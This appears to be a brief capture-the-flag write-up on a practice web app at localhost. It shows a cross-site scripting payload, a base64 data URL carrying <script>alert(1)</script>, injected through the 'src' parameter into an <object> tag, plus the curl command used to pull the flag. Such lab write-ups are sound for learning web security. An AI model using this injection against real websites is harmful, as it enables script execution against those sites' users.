GET /index.php?page=media&src=data:application/javascript;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==



the tag object hold as data a url to the nsa_prism jpg
and it is passed to it through the variable src

data:application/javascript;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
<object data=""> </object>

PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==



curl "http://localhost:8080/index.php?page=media&src=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==" | grep "The flag is :"


resource : https://developer.mozilla.org/en-US/docs/Web/HTTP/Basics_of_HTTP/Data_URLs